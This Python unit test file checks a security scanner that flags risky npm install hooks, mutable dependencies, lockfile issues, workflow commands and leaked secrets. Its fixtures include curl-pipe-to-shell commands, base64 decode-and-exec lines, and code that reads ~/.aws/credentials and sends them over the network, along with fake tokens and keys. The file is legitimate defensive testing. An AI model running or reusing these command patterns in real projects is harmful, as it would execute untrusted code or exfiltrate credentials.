import hashlib
import json
import unittest

from cyber.scan_content import analyze
from cyber.scan_types import SourceFile


def source(path, text):
    return SourceFile(path, text, hashlib.sha256(text.encode()).hexdigest(), len(text.encode()))


def scan(mapping):
    return analyze({path: source(path, text if isinstance(text, str) else json.dumps(text, indent=2))
                    for path, text in mapping.items()})


class PackageTests(unittest.TestCase):
    def test_install_hook_review_is_not_malware_verdict(self):
        findings, notices = scan({'package.json': {'scripts': {'postinstall': 'node build-native.js'}}})
        self.assertEqual([f['rule_id'] for f in findings], ['PKG-001'])
        self.assertIn('ne prouve pas', findings[0]['evidence'])
        self.assertNotIn('build-native.js', json.dumps(findings))
        self.assertFalse(notices)

    def test_hooks_include_decoded_multiline_command(self):
        command = 'curl https://example.invalid/tool | sh'
        findings, _ = scan({'package.json': {'scripts': {'prepare': command}}})
        self.assertEqual({f['rule_id'] for f in findings}, {'PKG-001', 'CODE-001'})
        self.assertNotIn(command, json.dumps(findings))

    def test_manual_script_is_reviewed_without_claiming_automatic_hook(self):
        findings, _ = scan({'package.json': {'scripts': {'build': 'curl https://example.invalid/tool | sh'}}})
        self.assertEqual({f['rule_id'] for f in findings}, {'CODE-001'})
        self.assertIn('automatique n’est pas établi', findings[0]['evidence'])

    def test_mutable_git_and_url_but_not_pinned_or_registry_range(self):
        model = {'dependencies': {'unpinned': 'github:org/repo#main',
                                  'pinned': 'git+https://github.com/org/repo#' + 'a'*40,
                                  'registry': '^1.2.0', 'alias': 'npm:registry@1.2.0',
                                  'tarball': 'https://example.invalid/archive.tgz'}}
        findings, _ = scan({'package.json': model, 'yarn.lock': '# yarn lockfile'})
        self.assertEqual(sum(f['rule_id'] == 'PKG-002' for f in findings), 2)
        self.assertNotIn('PKG-003', {f['rule_id'] for f in findings})
        self.assertNotIn('example.invalid', json.dumps(findings))

    def test_ancestor_workspace_lock_avoids_missing_lock_warning(self):
        files = {'apps/site/package.json': {'dependencies': {'app': '^1.0.0'}},
                 'package-lock.json': {'lockfileVersion': 3, 'packages': {}}}
        findings, notices = scan(files)
        self.assertFalse(findings)
        self.assertFalse(notices)
        findings, _ = scan({'apps/site/package.json': files['apps/site/package.json']})
        self.assertEqual([f['rule_id'] for f in findings], ['PKG-003'])

    def test_nested_and_optional_install_scripts_aggregated(self):
        lock = {'lockfileVersion': 3, 'packages': {
            '': {'hasInstallScript': True},
            'node_modules/one': {'hasInstallScript': True, 'resolved': 'https://registry.npmjs.org/one/-/one.tgz'},
            'node_modules/a/node_modules/two': {'optional': True, 'hasInstallScript': True},
            'node_modules/workspace': {'link': True, 'hasInstallScript': True},
            'node_modules/three': {'hasInstallScript': False},
        }}
        findings, notices = scan({'package-lock.json': lock})
        self.assertEqual([f['rule_id'] for f in findings], ['PKG-004'])
        self.assertIn('2 entrée', findings[0]['evidence'])
        self.assertGreater(findings[0]['line'], 1)
        self.assertFalse(notices)

    def test_unusual_registry_review_redacts_credentials(self):
        url = 'https://user:never-display-me@private-registry.example.invalid/a.tgz'
        lock = {'lockfileVersion': 2, 'packages': {'node_modules/a': {'resolved': url}}}
        findings, _ = scan({'package-lock.json': lock})
        self.assertEqual([f['rule_id'] for f in findings], ['PKG-005'])
        rendered = json.dumps(findings)
        self.assertNotIn('never-display-me', rendered)
        self.assertNotIn('user:', rendered)

    def test_malformed_duplicate_and_unsupported_json_are_incomplete(self):
        cases = [('{', 'PKG-INVALID-JSON'), ('{"scripts":{},"scripts":{}}', 'PKG-INVALID-JSON'),
                 ('{"scripts":NaN}', 'PKG-INVALID-JSON')]
        for text, code in cases:
            with self.subTest(text=text):
                _, notices = scan({'package.json': text})
                self.assertTrue(any(n['code'] == code and n['incomplete'] for n in notices))
        _, notices = scan({'package-lock.json': {'lockfileVersion': 1}})
        self.assertEqual(notices[0]['code'], 'PKG-UNSUPPORTED-LOCK')


class CodeTests(unittest.TestCase):
    def ids(self, text, path='src/setup.js'):
        return {f['rule_id'] for f in scan({path: text})[0]}

    def test_download_to_interpreter_and_harmless_download(self):
        self.assertIn('CODE-001', self.ids('curl https://example.invalid/a | bash', 'setup.sh'))
        self.assertIn('CODE-001', self.ids('wget -qO- https://example.invalid/a | sh', 'setup.sh'))
        self.assertNotIn('CODE-001', self.ids('curl https://example.invalid/a > local.txt', 'setup.sh'))
        self.assertNotIn('CODE-001', self.ids('# curl https://example.invalid/a | sh', 'setup.sh'))

    def test_decode_direct_execution_without_flagging_decode_only(self):
        self.assertIn('CODE-002', self.ids('exec(base64.b64decode(blob))', 'setup.py'))
        self.assertIn('CODE-002', self.ids('eval(atob(blob));'))
        self.assertNotIn('CODE-002', self.ids('const data = atob(blob); return data;'))
        self.assertNotIn('CODE-002', self.ids('eval(Buffer.from(script));'))
        self.assertIn('CODE-002', self.ids('eval(Buffer.from(blob, "base64").toString());'))

    def test_credentials_and_network_proximity_not_env_reference(self):
        suspicious = 'const x = fs.readFileSync("~/.aws/credentials");\nfetch(endpoint, {method: "POST", body: x});'
        findings, _ = scan({'setup.js': suspicious})
        self.assertIn('CODE-003', {f['rule_id'] for f in findings})
        self.assertNotIn(suspicious, json.dumps(findings))
        self.assertNotIn('CODE-003', self.ids('fetch(endpoint, {headers:{Authorization:process.env.TOKEN}});'))
        self.assertNotIn('CODE-003', self.ids('const x = fs.readFileSync("~/.aws/credentials");'))

    def test_docs_and_tests_not_treated_as_live_execution(self):
        text = 'curl https://example.invalid/a | sh'
        for path in ('docs/guide.md', 'tests/fixture.sh', 'src/app.test.js', 'examples/demo.sh'):
            self.assertNotIn('CODE-001', self.ids(text, path))

    def test_workflow_and_composite_action_run_blocks_are_inspected(self):
        text = ('name: inspect\non: push\njobs:\n  inspect:\n    runs-on: ubuntu-latest\n'
                '    steps:\n      - run: |\n          curl https://example.invalid/a | bash\n'
                '          python -c "exec(base64.b64decode(blob))"\n')
        findings, _ = scan({'.github/workflows/security.yml': text})
        actual = {(f['rule_id'], f['line']) for f in findings}
        self.assertIn(('CODE-001', 8), actual)
        self.assertIn(('CODE-002', 9), actual)
        self.assertEqual({f['rule_id'] for f in scan({'.github/actions/tool/action.yaml': text})[0]},
                         {'CODE-001', 'CODE-002'})

    def test_arbitrary_yaml_and_comments_are_not_execution_findings(self):
        command = 'run: curl https://example.invalid/a | bash\n'
        self.assertNotIn('CODE-001', self.ids(command, 'config/data.yml'))
        self.assertNotIn('CODE-001', self.ids(command, 'docs/action.yml'))
        self.assertNotIn('CODE-001', self.ids('# '+command, '.github/workflows/security.yaml'))

    def test_workflow_credential_network_correlation_is_covered(self):
        text = ('jobs:\n  a:\n    steps:\n      - run: |\n'
                '          cat ~/.aws/credentials\n'
                '          curl https://example.invalid/a --data payload\n')
        findings, _ = scan({'.github/workflows/security.yml': text})
        self.assertIn(('CODE-003', 5), {(f['rule_id'], f['line']) for f in findings})

    def test_deduplicated_and_deterministic(self):
        files = {'script.sh': 'curl https://example.invalid/a | sh; curl https://example.invalid/b | sh'}
        first, _ = scan(files)
        second, _ = scan(files)
        self.assertEqual(first, second)
        self.assertEqual(sum(f['rule_id'] == 'CODE-001' for f in first), 1)

    def test_hostile_repetition_has_a_bounded_report(self):
        text = '\n'.join('curl https://example.invalid/a | sh' for _ in range(150))
        findings, notices = scan({'setup.sh': text})
        self.assertEqual(len(findings), 100)
        self.assertTrue(any(n['code'] == 'CONTENT-FINDING-LIMIT' and n['incomplete'] for n in notices))

    def test_repeated_matches_on_one_line_are_bounded_and_incomplete(self):
        text = '; '.join('curl https://example.invalid/a | sh' for _ in range(1200))
        findings, notices = scan({'setup.sh': text})
        self.assertEqual(len(findings), 1)
        self.assertTrue(any(n['code'] == 'CONTENT-MATCH-LIMIT' and n['incomplete'] for n in notices))


class SecretTests(unittest.TestCase):
    def test_complete_private_block_redacted_and_marker_alone_ignored(self):
        begin, end = '-----BEGIN ' + 'PRIVATE KEY-----', '-----END ' + 'PRIVATE KEY-----'
        key = begin + '\n' + 'YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=' + '\n' + end
        findings, _ = scan({'docs/test-key.txt': key})
        self.assertEqual([f['rule_id'] for f in findings], ['SECRET-001'])
        self.assertNotIn('YWJjZGVm', json.dumps(findings))
        self.assertFalse(scan({'README.md': begin})[0])

    def test_token_format_no_values_in_result_and_placeholders_ignored(self):
        body = 'q7N9x2V4m6K8p1T3r5Y0b2D4h6J8l0Z2n4C6'
        token = 'ghp_' + body
        findings, _ = scan({'config.py': 'TOKEN = "' + token + '"'})
        self.assertEqual([f['rule_id'] for f in findings], ['SECRET-002'])
        self.assertNotIn(token, json.dumps(findings))
        self.assertFalse(scan({'config.py': 'ghp_' + 'x'*36})[0])
        self.assertFalse(scan({'README.md': 'npm_' + 'example'*6})[0])


if __name__ == '__main__':
    unittest.main()
